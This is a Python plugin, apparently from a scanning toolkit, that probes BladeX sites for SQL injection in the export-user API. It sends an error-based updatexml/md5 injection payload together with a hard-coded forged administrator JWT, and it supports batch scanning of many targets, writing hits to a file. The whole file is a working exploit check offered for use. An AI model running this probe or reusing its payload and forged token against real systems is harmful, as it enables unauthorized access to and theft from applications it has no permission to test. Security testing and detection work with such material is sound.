# body="https://bladex.vip/"
import requests,urllib3
from hashlib import md5
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Blade_SQLSACN:
	def randomInt(self,s,e):
		import random
		key=random.randint(int(s),int(e))
		return key
	def randomLowercase(self,n):
		key=""
		zf="qwertyuiopasdfghjklzxcvbnm"
		import random
		for _ in range(n):
			suiji1=random.randint(0,len(zf)-1)
			key+=zf[suiji1]
		return key

	def scan(self,baseurl):
		rand = self.randomInt(100000, 999999)
		url=baseurl+f"/api/blade-user/export-user?account=&realName=&1-updatexml(1,concat(0x5c,md5({rand}),0x5c),1)=1"
		headers={
		'User-Agent': self.headers,
		'Blade-Auth': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ'}
		try:
			response=requests.get(url,headers=headers,timeout=15,verify=self.ssl,proxies=self.proxy)
			if md5(str(rand).encode()).hexdigest()[6:16] in response.text:
				OutPrintInfoSuc("Bladex",f"存在Bladex-SQL注入{url}")
				if self.batch:
					OutPutFile("bladex_sql.txt",f"存在Bladex-SQL注入{url}")
			else:
				if not self.batch:
					OutPrintInfo("Bladex","不存在Bladex-SQL注入")
		except Exception:
			if not self.batch:
				OutPrintInfo("Bladex", "目标请求出错")
	def main(self, target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

		if not self.batch:
			OutPrintInfo("Blade", '开始执行Bladex-SQL检测...')
		self.scan(url)
		if not self.batch:
			OutPrintInfo("Bladex", 'Bladex-SQL检测结束')